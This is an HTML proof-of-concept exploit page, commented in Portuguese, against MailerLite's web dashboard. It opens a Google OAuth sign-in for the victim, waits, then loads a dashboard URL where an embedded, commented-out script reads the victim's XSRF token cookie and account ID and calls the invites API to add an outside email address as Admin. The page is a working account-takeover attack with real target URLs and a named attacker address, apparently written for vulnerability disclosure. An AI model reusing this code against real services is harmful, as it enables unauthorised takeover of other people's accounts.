<!DOCTYPE html>
<html>
<head>
    <title>PoC Corrigida</title>
</head>
<body>
    <h1>Iniciando demonstração...</h1>
    <script>
        // URL de autenticação do Google (extraída do PoC original)
        const authUrl = "https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm8wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw";

        // URL onde o payload será executado (pode ser uma página controlada pelo atacante
        // que, por sua vez, carrega a URL alvo em um iframe, ou redireciona para ela)
        // Neste caso, vamos direto ao ponto.
        const payloadUrl = "https://dashboard.mailerlite.com/products/167453999052621465/checkout/edit?ato";

        // Função que contém o payload CSRF final.
        // Esta função seria hospedada em uma URL controlada pelo atacante
        // ou injetada na página alvo se houver uma vulnerabilidade de XSS.
        // Para a PoC, simulamos que a página 'payloadUrl' já contém este script.
        /*
        if (window.location.search === "?ato") {
            setTimeout(function() {
                try {
                    // O código para extrair XSRF-TOKEN e accountId permanece o mesmo
                    const xsrfToken = decodeURIComponent(window.top.document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
                    const accountId = window.top.document.querySelector('meta[name="account-id"]').getAttribute('content');
                    
                    fetch('https://dashboard.mailerlite.com/api/invites', {
                        method: 'PUT',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json, text/plain, */*',
                            'X-Xsrf-Token': xsrfToken,
                            'X-Requested-With': 'XMLHttpRequest',
                            'X-Acc-Id': accountId
                        },
                        body: JSON.stringify({
                    role: "Admin",
                    permissions: [],
                    campaigns: [],
                    requires_periodic_password_change: true,
                    email: "gustavoribeirounic@gmail.com",
                        }),
                        credentials: 'include'
                    }).then(res => console.log("Requisição enviada:", res.status));
                } catch(e) {
                    console.error("Erro ao executar o fetch:", e);
                }
            }, 4000); // Delay para garantir que a página carregou
        }
        */

        function runAttack() {
            console.log("[ETAPA 1] Abrindo janela de autenticação para estabelecer a sessão da vítima.");
            // Abre a autenticação em uma nova aba. A vítima interage com ela.
            const authWindow = window.open(authUrl, '_blank');

            // Define um tempo de espera para que a vítima complete o login.
            // 15 segundos é um valor arbitrário para a PoC.
            const loginDelay = 15000; 
            console.log(`[ETAPA 2] Aguardando ${loginDelay / 1000} segundos para a vítima completar o login...`);

            setTimeout(() => {
                console.log("[ETAPA 3] Login provavelmente concluído. Abrindo URL com payload em uma nova janela.");
                // Agora que a vítima está (provavelmente) logada, abrir a URL com o payload
                // fará com que o navegador envie os cookies de sessão corretos.
                window.open(payloadUrl, '_blank');
            }, loginDelay);
        }

        // Inicia o ataque com um clique para contornar bloqueadores de pop-up
        document.body.innerHTML += '<button onclick="runAttack()">Iniciar Teste</button>';
    </script>
</body>
</html>
